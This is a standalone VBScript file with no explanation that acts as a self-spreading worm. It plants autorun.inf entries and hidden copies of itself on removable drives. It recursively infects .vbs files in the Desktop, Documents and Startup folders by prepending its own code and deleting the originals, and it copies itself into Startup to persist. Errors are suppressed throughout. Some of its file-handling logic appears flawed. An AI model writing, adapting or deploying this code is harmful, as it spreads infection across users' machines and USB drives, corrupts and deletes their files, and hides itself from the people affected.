On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set colDrives = FSO.Drives
Dim fileName
Const ForReading = 1, ForWriting = 2, ForAppending = 8, properties = 6
For Each drive in colDrives
	If drive.DriveType = 1 Then
		fileName = (drive.DriveLetter & ":\autorun.inf")
		If FSO.FileExists(fileName) = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.Close
		End If
		If FSO.GetFile(fileName).Size = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.WriteLine("[AutoRun]")
			targetFile.Close
		End If
		Set targetFile = FSO.OpenTextFile(fileName, ForAppending)
		Set pattern = New RegExp
		pattern.IgnoreCase = False
		pattern.Global = True
		pattern.Pattern = "\[AutoRun\]"
		If pattern.Test(FSO.OpenTextFile(fileName).ReadAll) = False Then
			targetFile.WriteLine("[AutoRun]")
		End If
		targetFile.WriteLine("shellexecute=" & chr(34) & Wscript.ScriptName & chr(34))
		targetFile.Close
		If FSO.FileExists(drive.DriveLetter & ":\" & Wscript.ScriptName) = 0 Then		
			FSO.CopyFile Wscript.ScriptFullName, drive.DriveLetter & ":\"
			Set mapFile = FSO.GetFile(drive.DriveLetter & ":\" & Wscript.ScriptName)
			mapFile.Attributes = properties
		End If
		Set mapFile = FSO.GetFile(drive.DriveLetter & ":\autorun.inf")
		mapFile.Attributes = properties
	End If
Next
Function infectvbs(folder)
	If FSO.FileExists(folder & Wscript.ScriptName) = 0 Then		
			FSO.CopyFile Wscript.ScriptFullName, folder
			Set mapFile = FSO.GetFile(folder & Wscript.ScriptName)
			mapFile.Attributes = properties			
	End If
	For Each searchtarget In FSO.GetFolder(folder).Files
		If LCase(FSO.GetExtensionName(searchtarget.Name)) = "vbs" Then
            Set targetFile = FSO.OpenTextFile("system32.tmp", ForAppending)
			targetFile.WriteLine( FSO.OpenTextFile( Wscript.ScriptFullName, ForReading ).ReadAll & vbNewLine & FSO.OpenTextFile( searchtarget, ForReading).ReadAll )
			fileName = searchtarget.Name
			FSO.DeleteFile fileName
			FSO.OpenTextFile( Wscript.ScriptFullName, ForWriting, True ).WriteLine( FSO.OpenTextFile("system32.tmp", ForReading).ReadAll)
			FSO.DeleteFile "system32.tmp"
		End If
		For Each SubFolder In FSO.GetFolder(folder).SubFolders
			infectvbs(folder & SubFolder.Name & "\")
		Next
	Next
End Function
infectvbs(Wscript.CreateObject("Wscript.Shell").SpecialFolders("Desktop"))
infectvbs(Wscript.CreateObject("Wscript.Shell").SpecialFolders("Documents"))
infectvbs(Wscript.CreateObject("Wscript.Shell").SpecialFolders("Startup"))
FSO.CopyFile Wscript.ScriptFullName, Wscript.CreateObject("Wscript.Shell").SpecialFolders("Startup")



